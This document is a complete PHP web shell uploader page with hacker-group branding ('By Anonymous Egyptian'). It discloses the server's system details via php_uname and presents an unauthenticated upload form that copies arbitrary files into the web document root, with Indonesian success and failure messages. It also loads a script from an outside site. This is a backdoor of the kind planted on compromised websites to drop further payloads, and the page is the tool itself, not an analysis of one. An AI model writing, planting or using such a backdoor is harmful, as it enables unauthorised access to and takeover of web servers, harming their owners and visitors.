<html><title>By Anonymous Egyptian</title>
<link rel=icon type="image/png" href="http://cdn.countryflags.com/thumbs/egypt/flag-3d-round-250.png">

<script src="http://e-mete.com/js/kdsnow.js"></script> <style> body{ background-image: url(); background-repeat: no-repeat; background-attachment: fixed; background-position: top; background-color:#000000; position: relative; background-size:100% 100vh; } .logo { width: 300px; height: 300px; margin: 0 auto; margin-top: 50px; -webkit-filter: drop-shadow(0px 0px 7px #0080FF); filter: drop-shadow(0px 0px 7px #0080FF); } .logo:hover{ width: 300px; height: 300px; -webkit-filter: drop-shadow(0px 0px 10px #0080FF); opacity:0.4; filter:alpha(opacity=40); transition: opacity .2s ease-out; -moz-transition: opacity .2s ease-out; -webkit-transition: opacity .2s ease-out; -o-transition: opacity .2s ease-out; }</style> 
<table width="100%" height="100%"><td align=center>
<img src="https://pbs.twimg.com/profile_images/1554050103/Anonymous_BW_PNG.png" width="350" height="350">
<font color=cyan>
<?php
echo "https://www.facebook.com/Egyptian.AnonymousPro<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='just_file'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['just_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "sukses upload -> <a href='$web$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "gagal upload di document root.";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo " upload <b>$files</b> di folder ini";
		} else {
			echo "gagal upload";
		}
	}
}
?>

<style type="text/css">
h1 {color: #333;font-size: 100px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
h2 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Audiowide;}
.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
h3 {color: #333;font-size: 35px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Audiowide;}
.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
.matrix {color: #FFFFFF; font-family:Arial, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
.jokitz1{
	text-align : center;
	}
.jokitz2{
	text-align : center;
	font-family : Courier;
	}
			.link-container a,

.skidie{

		font-family: 'Orbitron', sans-serif;
		
		
		
	}
body {	
background: black url("http://i.giphy.com/l0HlKWTSp1R02aQM0.gif");
background-repeat: repeat;
background-position: center;
background-attachment: fixed;
}
</style>
</head>

</font></table></td></html>